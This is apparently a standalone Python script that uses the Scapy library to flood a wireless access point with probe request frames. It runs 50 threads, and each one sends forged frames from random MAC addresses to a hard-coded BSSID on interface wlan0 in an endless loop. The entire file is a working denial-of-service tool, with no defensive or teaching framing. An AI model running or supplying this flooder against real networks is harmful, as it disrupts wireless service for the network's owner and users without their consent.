from scapy.all import *
from threading import Thread
from random_mac import random_mac
import traceback

def proberequest(bssid):
	print('[+] Flooding '+bssid+' with Probe Requests')

	tc = 50
	all_threads = []

	for i in range(tc):
		t = Thread(target=_flood,args=(bssid,))
		t.daemon = True
		t.start()
		all_threads.append(t)

	all_threads[0].join()

def _flood(bssid):
    #addr1 = Destination Address
    #addr2 = Source Address
	while True:
		pkt = RadioTap()/Dot11(type=0,subtype=4,addr1=bssid,addr2=random_mac())/Dot11ProbeReq()
		sendp(pkt,iface='wlan0',verbose=0)

proberequest('84:a4:23:8d:c6:30')
